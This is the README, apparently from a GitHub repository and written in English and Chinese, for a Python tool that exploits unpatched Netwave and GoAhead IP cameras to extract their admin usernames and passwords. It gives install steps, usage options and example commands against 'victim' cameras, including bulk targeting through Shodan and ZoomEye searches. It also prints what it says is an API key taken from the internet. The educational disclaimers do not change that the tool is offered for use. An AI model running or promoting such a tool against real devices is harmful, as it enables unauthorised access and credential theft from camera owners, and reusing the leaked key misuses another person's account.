# ExpCamera
Exploit Netwave and GoAhead IP Camera  
Expcamera is a tool for exploiting vulnerable Netwave and GoAhead IP camera to get the username and password.  
Environment:Linux,Python3  
	
**Attention:this tool is just for educational!**  
**Please comply with local laws and regulations!**  

![exploit](https://github.com/vanpersiexp/expcamera/blob/master/img/demo_1.gif?raw=true)

# Installation
	git clone https://github.com/vanpersiexp/expcamera.git  
	pip3 install -r related.txt  
# Usage
	python3 exploit_camera.py -h  

	usage: exploit_camera.py [-h] [-b {1,2}] [-o OUTPUTFILE] [-T TIMEOUT]  
        	                 [-t TASKS] [-q | -v]   
				 [-i IP | -l INPUTFILE | --shodan SHODAN | --zoomeye ZOOMEYE]

	Exploit IP Camera. Please use it just in educational purpose!  

	optional arguments:  
	  -h, --help     show this help message and exit  
	  -b {1,2},--brand {1,2}  
		         Choose the brand of IP Camera. 1 represents Netwave,2  
	                 represents GoAhead.  
	  -o OUTPUTFILE,--output OUTPUTFILE  
		         Output into path you input.The default path in dir /tmp  
	  -T TIMEOUT,--timeout TIMEOUT  
		         The default timout for netwave is 300s.  
	  -t TASKS,--task TASKS  
	                 Run TASKS number of connects in parallel,default is 10  
	  -c COUNT,--count COUNT
			 The number of ip you want to get from ZoomEye.The maximum is 2000. Default is 100.
	  -q,--quiet     Quiet mode.  
	  -v,--verbose   Show more informations.  
	  -i IP,--ip IP  The camera's ip and port.Example: 192.168.1.100:80  
	  -l INPUTFILE,--list INPUTFILE  
		         The camera's ip:port address file. The file's format  
			 like this 192.168.1.100:80 in a line.  
	  --shodan SHODAN
			 Your Shodan API Key. You can get help from https://www.shodan.io/
	  --zoomeye ZOOMEYE
			 Your ZoomEye API Key. You can get help from https://www.zoomeye.org/api
# Example
1.Victim IP Camera's brand is Netwave.The ip is 192.168.1.100 and port is 80.  

	python3 exploit_camera.py -b 1 -i 192.168.1.100:80 -v  

2.Victim IP Camera's brand is GoAhead.The iplist.txt is given.   
The iplist.txt show as below:  
192.168.1.10:80  
192.168.1.100:81  
192.168.1.200:8080  

	python3 exploit_camera.py -b 2 -l iplist.txt -v

3.Use Shodan API Key to exploit GoAhead.(The API Key is from internet.)

	python3 exploit_camera.py -b 2 -v --shodan lIzylEk4vS3k8TtAR9QreK24tG0b8xBZ
	
# References
http://www.cnvd.org.cn/flaw/show/CNVD-2017-01037  
http://cn.0day.today/exploit/26889  
https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html  
http://www.cert.org.cn/publish/main/9/2017/20170320152751379105282/20170320152751379105282_.html  


# 中文版
Netwave和GoAhead多款摄像头密码泄漏漏洞的利用工具。  
本工具用于针对仍未修补漏洞的摄像头，可以获取摄像头的管理员账户和密码。  
使用环境：Linux,Python3。  

**注意：此工具只用于学习交流目的。**  
**请严格遵守您所在国家的法律法规！**  

# 安装
	git clone https://github.com/vanpersiexp/expcamera.git  
	pip3 install -r related.txt  
# 使用
	python3 exploit_camera.py -h  

	usage: exploit_camera.py [-h] [-b {1,2}] [-o OUTPUTFILE] [-T TIMEOUT]  
        	                 [-t TASKS] [-q | -v]   
				 [-i IP | -l INPUTFILE | --shodan SHODAN | --zoomeye ZOOMEYE]

	Exploit IP Camera. Please use it just in educational purpose!  

	optional arguments:  
	  -h, --help     show this help message and exit.帮助信息   
	  -b {1,2}       Choose the brand of IP Camera. 1 represents Netwave,2  
	                 represents GoAhead.选择摄像头品牌，1代表Netwave，2代表GoAhead。  
	  -o OUTPUTFILE  Output into path you input.The default path in dir /tmp.输出文件路径，默认为/tmp  
	  -T TIMEOUT     The default timout for netwave is 300s.默认超时时间为300s。  
	  -t TASKS       Run TASKS number of connects in parallel,default is 10.多任务同时处理，默认为10。  
	  -c COUNT	 The number of ip you want to get from ZoomEye.The maximum is 2000. Default is 100.
			 你可以从ZoomEye上获取的ip数量。最大值为2000。默认值为100。 
	  -q             Quiet mode.安静模式。  
	  -v             Show more informations.显示更多信息。    
	  -i IP          The camera's ip and port.Example: 192.168.1.100:80.摄像头ip和port形式。例如：192.168.1.100:80。    
	  -l INPUTFILE   The camera's ip:port address file. The file's format like  
	                 this 192.168.1.100:80 in a line.摄像头ip和port文件格式。每一行都以192.168.1.100:80的形式。 
	  --shodan SHODAN
			 Your Shodan API Key. You can get help from https://www.shodan.io/
			 你Shodan的API Key。你可以从https://www.shodan.io/获取帮助。
	  --zoomeye ZOOMEYE
			 Your ZoomEye API Key. You can get help from https://www.zoomeye.org/api
			 你ZoomEye的API Key。你可以从https://www.zoomeye.org/api获取帮助。

 
# 例子
1.摄像头品牌为Netwave。IP地址为192.168.1.100, port端口为80。  

	python3 exploit_camera.py -b 1 -i 192.168.1.100:80 -v  

2.摄像头品牌为GoAhead。IP地址文件iplist.txt如下所示：  
192.168.1.10:80  
192.168.1.100:81  
192.168.1.200:8080  

	python3 exploit_camera.py -b 2 -l iplist.txt -v
	
3.使用Shodan的API Key进行攻击GoAhead品牌摄像头。

	python3 exploit_camera.py -b 2 -v --shodan lIzylEk4vS3k8TtAR9QreK24tG0b8xBZ

# 参考
http://www.cnvd.org.cn/flaw/show/CNVD-2017-01037  
http://cn.0day.today/exploit/26889  
https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html  
http://www.cert.org.cn/publish/main/9/2017/20170320152751379105282/20170320152751379105282_.html  


